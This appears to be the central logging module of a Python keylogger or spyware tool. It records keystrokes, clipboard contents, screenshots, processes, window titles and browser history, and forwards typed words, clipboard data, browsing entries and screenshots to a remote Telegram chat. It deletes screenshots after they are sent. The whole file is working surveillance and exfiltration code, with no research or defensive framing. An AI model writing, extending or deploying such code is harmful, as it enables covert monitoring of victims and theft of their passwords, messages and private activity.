import json
import os
from datetime import datetime
from src.telegram_reporter import create_telegram_reporter
import asyncio
import threading
import logging
import pytz  # Use pytz instead of zoneinfo
import time
from threading import Timer

logger = logging.getLogger(__name__)

class CentralLogger:
    _instance = None
    
    def __new__(cls, *args, **kwargs):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, log_dir=None, telegram_token=None, telegram_chat_id=None):
        # Only initialize if not already initialized
        if not hasattr(self, '_initialized'):
            try:
                # Get absolute path for log directory
                if log_dir is None:
                    project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
                    log_dir = os.path.join(project_root, "logs")
                
                self.log_dir = os.path.abspath(log_dir)
                logger.info(f"Initializing CentralLogger with log_dir: {self.log_dir}")
                
                # Create logs directory if it doesn't exist
                if not os.path.exists(self.log_dir):
                    os.makedirs(self.log_dir)
                    logger.info(f"Created logs directory: {self.log_dir}")

                # Create separate log files for each event type
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                self.log_files = {
                    "keypress": os.path.join(self.log_dir, f"keystrokes_{timestamp}.json"),
                    "screenshot": os.path.join(self.log_dir, f"screenshots_{timestamp}.json"),
                    "clipboard": os.path.join(self.log_dir, f"clipboard_{timestamp}.json"),
                    "process": os.path.join(self.log_dir, f"processes_{timestamp}.json"),
                    "active_window": os.path.join(self.log_dir, f"windows_{timestamp}.json"),
                    "browser_history": os.path.join(self.log_dir, f"browser_history_{timestamp}.json")
                }

                # Initialize each log file with an empty array
                for log_file in self.log_files.values():
                    with open(log_file, 'w') as f:
                        json.dump([], f)

                self.telegram_reporter = None
                self.timezone = pytz.timezone('America/New_York')  # Use pytz.timezone instead of ZoneInfo
                
                # Add screenshot cleanup tracking
                self._screenshot_timers = {}
                self._screenshot_retention = 180  # 3 minutes in seconds
                
                self._initialized = True
                
            except Exception as e:
                logger.error(f"Error initializing CentralLogger: {e}", exc_info=True)
                raise

        # Update Telegram credentials if provided
        if telegram_token and telegram_chat_id:
            self.update_telegram_credentials(telegram_token, telegram_chat_id)

    def update_telegram_credentials(self, token, chat_id):
        """Update Telegram credentials and reinitialize reporter if needed"""
        if token and chat_id:  # Only update if both values are provided
            if self.telegram_reporter is None or (
                token != getattr(self.telegram_reporter, 'token', None) or 
                chat_id != getattr(self.telegram_reporter, 'chat_id', None)
            ):
                self.telegram_reporter = create_telegram_reporter(token, chat_id)
                self._start_telegram_reporter()

    def _start_telegram_reporter(self):
        if self.telegram_reporter:
            def run_telegram_bot():
                asyncio.run(self.telegram_reporter.start())
            
            telegram_thread = threading.Thread(target=run_telegram_bot)
            telegram_thread.daemon = True
            telegram_thread.start()

    def log_event(self, event_type, data):
        """Log an event with the given type and data"""
        try:
            # Get current time in Eastern timezone
            current_time = datetime.now(self.timezone)
            
            if event_type == "browser_history":
                if not hasattr(self, '_processed_history_urls'):
                    self._processed_history_urls = set()
                
                url = data.get('url', '')
                
                # Debug logging
                logger.debug(f"Processing browser history event:")
                logger.debug(f"URL: {url}")
                logger.debug(f"Already processed: {url in self._processed_history_urls}")
                
                if url not in self._processed_history_urls:
                    if data.get("notify", False):
                        if hasattr(self, 'telegram_reporter') and self.telegram_reporter:
                            # Parse the visit time and ensure it's in Eastern time
                            visit_time = datetime.fromisoformat(data['visit_time'])
                            if not visit_time.tzinfo:
                                visit_time = visit_time.replace(tzinfo=self.timezone)
                            elif visit_time.tzinfo != self.timezone:
                                visit_time = visit_time.astimezone(self.timezone)
                            
                            logger.debug(f"Visit time: {visit_time}")
                            logger.debug(f"Current time: {current_time}")
                            
                            time_diff = (current_time - visit_time).total_seconds()
                            logger.debug(f"Time difference: {time_diff} seconds")
                            
                            if time_diff <= 5:
                                self.telegram_reporter.send_message(
                                    f"New browser history:\n"
                                    f"Browser: {data['browser']}\n"
                                    f"Title: {data['title']}\n"
                                    f"URL: {url}\n"
                                    f"Time: {visit_time.strftime('%Y-%m-%d %I:%M:%S %p %Z')}"
                                )
                                self._processed_history_urls.add(url)
                
                if len(self._processed_history_urls) > 1000:
                    self._processed_history_urls.clear()
            
            if "notify" in data:
                del data["notify"]
            
            # Create log entry with Eastern timezone timestamp
            log_entry = {
                "timestamp": current_time.isoformat(),
                "data": data
            }
            
            self._write_to_file(event_type, log_entry)
            
        except Exception as e:
            logger.error(f"Error logging event: {e}", exc_info=True)

    def _serialize_data(self, data):
        """Serialize data for JSON storage"""
        if isinstance(data, dict):
            return {k: self._serialize_data(v) for k, v in data.items()}
        elif isinstance(data, list):
            return [self._serialize_data(item) for item in data]
        elif isinstance(data, datetime):
            return data.isoformat()
        else:
            return data

    def cleanup_screenshot(self, filepath):
        """Delete screenshot file if it exists"""
        try:
            if os.path.exists(filepath):
                os.remove(filepath)
                logger.debug(f"Deleted screenshot: {filepath}")
            if filepath in self._screenshot_timers:
                del self._screenshot_timers[filepath]
        except Exception as e:
            logger.error(f"Error deleting screenshot {filepath}: {e}")

    def schedule_screenshot_deletion(self, filepath):
        """Schedule screenshot for deletion after retention period"""
        try:
            # Cancel existing timer if any
            if filepath in self._screenshot_timers:
                self._screenshot_timers[filepath].cancel()
            
            # Create new timer
            timer = Timer(self._screenshot_retention, self.cleanup_screenshot, args=[filepath])
            timer.daemon = True
            timer.start()
            self._screenshot_timers[filepath] = timer
            
            logger.debug(f"Scheduled deletion for screenshot: {filepath}")
        except Exception as e:
            logger.error(f"Error scheduling screenshot deletion: {e}")

    def _write_to_file(self, event_type, log_entry):
        """Write log entry to the appropriate file"""
        if event_type not in self.log_files:
            logger.warning(f"Unknown event type: {event_type}")
            return

        log_file = self.log_files[event_type]
        try:
            # Read existing logs
            logs = []
            if os.path.exists(log_file):
                with open(log_file, 'r') as f:
                    try:
                        logs = json.load(f)
                    except json.JSONDecodeError:
                        logs = []
            
            # Append new log entry
            if not isinstance(logs, list):
                logs = []
            logs.append(log_entry)
            
            # Write back to file with proper formatting
            with open(log_file, 'w') as f:
                json.dump(logs, f, indent=2)
            
            # Send notification for certain events if Telegram reporter is enabled
            if self.telegram_reporter and event_type in ['keypress', 'clipboard', 'browser_history', 'screenshot']:
                try:
                    if event_type == 'screenshot':
                        # Send screenshot with caption
                        filepath = log_entry['data'].get('filepath')
                        if filepath and os.path.exists(filepath):
                            caption = f"📸 Screenshot captured at {log_entry['timestamp']}"
                            
                            async def send_and_cleanup():
                                try:
                                    await self.telegram_reporter.send_photo(filepath, caption)
                                    self.schedule_screenshot_deletion(filepath)
                                except Exception as e:
                                    logger.error(f"Error sending screenshot to Telegram: {e}")
                                    self.schedule_screenshot_deletion(filepath)
                            
                            # Try to send immediately and delete after sending
                            asyncio.run(send_and_cleanup())
                        else:
                            logger.warning(f"Screenshot file not found: {filepath}")
                    
                    elif event_type == 'browser_history':
                        message = "🌐 New browser history entry:\n"
                        data = log_entry['data']
                        message += f"URL: {data.get('url', 'N/A')}\n"
                        message += f"Title: {data.get('title', 'N/A')}\n"
                        message += f"Time: {data.get('visit_time', 'N/A')}"
                        asyncio.run(self.telegram_reporter.send_message(message))
                    
                    elif event_type == 'keypress':
                        if 'word' in log_entry['data']:
                            # Handle word completion events
                            data = log_entry['data']
                            window = data['window']
                            word = data['word']
                            completion = data['completion_key']
                            message = f"⌨️ Word in {window}:\n{word}"
                            if completion == 'enter':
                                message += " [ENTER]"
                            asyncio.run(self.telegram_reporter.send_message(message))
                        elif 'keys' in log_entry['data']:
                            # Handle batched keypress events
                            keys = log_entry['data']['keys']
                            window = log_entry['data']['window']
                            key_text = ''.join(k['key'] for k in keys if len(k['key']) == 1)
                            if key_text:  # Only send if there are actual characters
                                message = f"⌨️ Keypress batch in {window}:\n{key_text}"
                                if len(message) > 3000:
                                    message = message[:3000] + "..."
                                asyncio.run(self.telegram_reporter.send_message(message))
                    
                    else:
                        # Handle other event types
                        message = f"New {event_type} event:\n"
                        data_str = json.dumps(log_entry['data'], indent=2)
                        if len(data_str) > 3000:
                            data_str = data_str[:3000] + "..."
                        message += data_str
                        asyncio.run(self.telegram_reporter.send_message(message))
                    
                except Exception as e:
                    logger.error(f"Error sending Telegram notification: {e}")
                    
        except Exception as e:
            logger.error(f"Error writing to {event_type} log: {str(e)}")

    def get_log_files(self):
        """Get the dictionary of log file paths"""
        return self.log_files

    def __del__(self):
        """Cleanup method to cancel any remaining timers"""
        try:
            for timer in self._screenshot_timers.values():
                timer.cancel()
        except Exception:
            pass

# Initialize central logger without credentials
central_logger = CentralLogger()

# Helper functions remain the same but now use the singleton instance
def log_keypress(window, key):
    central_logger.log_event("keypress", {"window": window, "key": str(key)})

def log_screenshot(filepath):
    central_logger.log_event("screenshot", {"filepath": filepath})

def log_clipboard(content):
    central_logger.log_event("clipboard", {"content": content})

def log_process(pid, name, cpu_percent):
    central_logger.log_event("process", {"pid": pid, "name": name, "cpu_percent": cpu_percent})

def log_active_window(title):
    central_logger.log_event("active_window", {"title": title})

def log_browser_history(url, title, visit_time):
    central_logger.log_event("browser_history", {"url": url, "title": title, "visit_time": visit_time})
